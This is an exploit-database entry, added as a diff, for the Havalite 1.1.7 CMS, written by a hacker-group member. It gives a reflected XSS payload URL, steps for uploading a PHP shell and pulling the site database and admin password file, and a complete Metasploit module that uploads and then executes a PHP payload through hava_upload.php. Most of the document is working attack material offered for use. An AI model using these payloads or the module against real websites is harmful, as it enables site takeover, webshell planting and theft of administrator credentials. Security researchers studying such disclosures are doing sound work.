@@ -1,0 +1,182 @@
+id: 19929
+date: 12/09/2012
+title: Havalite v1.1.7 Mutiple Vulnerabilities
+author: KedAns-Dz
+cves: 
+
+# 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+# 0     _                   __           __       __                     1
+# 1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+# 0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+# 1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+# 0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+# 1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+# 0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+# 1                  \ \____/ >> Exploit database separated by exploit   0
+# 0                   \/___/          type (local, remote, DoS, etc.)    1
+# 1                                                                      1
+# 0  [+] Site            : 1337day.com                                   0
+# 1  [+] Support e-mail  : submit[at]1337day.com                         1
+# 0                                                                      0
+# 1               #########################################              1
+# 0               I'm KedAns-Dz member from Inj3ct0r Team                1
+# 1               #########################################              0
+# 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+ 
+###
+# Title : Havalite v1.1.7 Mutiple Vulnerabilities
+# Author : KedAns-Dz
+# E-mail : ked-h (@hotmail.com / @1337day.com)
+# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
+# Web Site : www.1337day.com .net .org
+# FaCeb0ok : http://fb.me/Inj3ct0rK3d
+# Friendly Sites : www.r00tw0rm.com * www.exploit-id.com
+# Platform/CatID : php - remote
+# Type : php - proof of concept - metasploit
+# Tested on : Windows7 , Linux SUSE v.11
+# Download : [http://havalite.com/?p=15]
+###
+ 
+# <3 <3 Greetings t0 Palestine <3 <3
+# Greetings To BarbarOS-Dz in the jail x_x ! F-ck HaCking, Lov3 Explo8ting
+
+#### Exploit & Proof of concept ####>>
+#
+###[ POC-1 : XSS Exploit ] ==>
+#
+# [+] http://127.0.0.1/havalite/hava_user.php?userId=%22%3E%3Ciframe%20src=a%20onload=alert%28%22KedAns%22%29%20%3C
+#
+###[ POC-2 : Shell Upload ] ==>
+#
+# Go to: http://127.0.0.1/hava_upload.php
+# Upload : KedAns_Sh3ll.php
+# Shell Access : http://127.0.0.1/tmp/files/KedAns_Sh3ll.php
+# 
+###[ POC-3 : Full Config Disclosure ] ==>
+#
+# [+] After upload your shell dowload /data/havalite.db3
+# line 16 : "admine10adc3949ba59abbe56e057f20f883e0ked-h@hotmail.comg6mb11ootsupjifmhphttp://127.0.0.1/havalite"
+#
+# [+] Or get /data/.htpasswd and get adm:pwd => "admin:123456"
+#
+###
+
+###[ File/Shell Upload with Metasploit ] ==>
+
+require 'msf/core'
+ 
+class Metasploit3 < Msf::Exploit::Remote
+Rank = GreatRanking
+ 
+include Msf::Exploit::Remote::HttpClient
+ 
+def initialize(info={})
+super(update_info(info,
+'Name'           => "Havalite v1.1.0->1.1.7 File Upload and Command Execution",
+'Description'    => %q{
+This module exploits a Multiple cross-site request forgery (CSRF) vulnerabilities
+in hava_upload.php in Havalite 1.1.7 allow remote attackers can upload file.
+},
+'License'        => MSF_LICENSE,
+'Author'         =>
+[
+'KedAns-Dz <ked-h[at]1337day.com>', # Discovery PoC ,and Metasploit module
+],
+'References'     =>
+[
+['CVE', '2012-5892','2012-5893','2012-5894'],
+['OSVDB', '80770','80769','80768'],
+['URL', 'http://1337day.com/exploit/description/17877'], # 1337ID-17877
+['URL', 'http://packetstormsecurity.org/files/111358/Havalite-CMS-Shell-Upload-SQL-Injection-Disclosure.html'] # PS-SEC-111358
+],
+'Payload'        =>
+{
+'BadChars' => "\x00"
+},
+'DefaultOptions'  =>
+{
+'ExitFunction' => "none"
+},
+'Platform'       => ['php'],
+'Arch'           => ARCH_PHP,
+'Targets'        =>
+[
+['Havalite v1.1.7', {}]
+],
+'Privileged'     => false,
+'DisclosureDate' => "Dec 10 2012",
+'DefaultTarget'  => 0))
+ 
+register_options(
+[
+OptString.new('TARGETURI', [true, 'The base path to Havelite', '/havelite'])
+], self.class)
+end
+ 
+def check
+uri = target_uri.path
+uri << '/' if uri[-1,1] != '/'
+ 
+res = send_request_cgi({
+'method' => 'GET',
+'uri'    => "#{uri}hava_upload.php"
+})
+ 
+if res and res.code == 200 and res.body.empty?
+return Exploit::CheckCode::Detected
+else
+return Exploit::CheckCode::Safe
+end
+end
+ 
+def exploit
+uri = target_uri.path
+uri << '/' if uri[-1,1] != '/'
+ 
+peer = "#{rhost}:#{rport}"
+payload_name = Rex::Text.rand_text_alpha(rand(5) + 5) + '.php'
+ 
+post_data = "--1337day\r\n"
+post_data << "Content-Disposition: form-data; name=\"Filedata\"; filename=\"#{payload_name}\"\r\n\r\n"
+post_data << "Content-Type : text/html;\r\n"
+post_data << "<?php "
+post_data << payload.encoded
+post_data << " ?>\r\n"
+post_data << "--1337day\r\n"
+ 
+print_status("#{peer} - Sending PHP payload (#{payload_name})")
+res = send_request_cgi({
+'method' => 'POST',
+'uri'    => "#{uri}hava_upload.php",
+'ctype'  => 'multipart/form-data; boundary=1337day',
+'data'   => post_data
+})
+ 
+if not res or res.code != 200 or res.body !~ /#{payload_name}/
+print_error("#{peer} - I don't think the file was uploaded !")
+return
+end
+ 
+print_status("#{peer} - Executing PHP payload (#{payload_name})")
+# Execute our payload
+res = send_request_cgi({
+'method' => 'GET',
+'uri'    => "#{uri}tmp/files/#{payload_name}"
+})
+ 
+if res and res.code != 200
+print_status("#{peer} - Server returns #{res.code.to_s}")
+end
+end
+ 
+#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]===============================================
+# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > | Indoushka , Caddy-Dz , Kalashinkov3 , Mennouchi.Islem
+# Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz, KinG Of PiraTeS, TrOoN, T0xic, Chevr0sky, Black-ID, Barbaros-DZ,
+# +> Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (1337day.com) * CrosS (r00tw0rm.com)
+# Inj3ct0r Members 31337 : KedAns ^^ * KnocKout * SeeMe * Kalashinkov3 * ZoRLu * anT!-Tr0J4n * Angel Injection
+# NuxbieCyber (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * xDZx * HD Moore * YMCMB ..all
+# Exploit-ID Team : jos_ali_joe + kaMtiEz + r3m1ck (exploit-id.com) * Milw0rm * KeyStr0ke * JF * L3b-r1Z * HMD
+# packetstormsecurity.org * metasploit.com * r00tw0rm.com * OWASP Dz * Dis9-UE * All Security and Exploits Webs
+#============================================================================================================
+
+#  0day.today [2023-03-25]  #
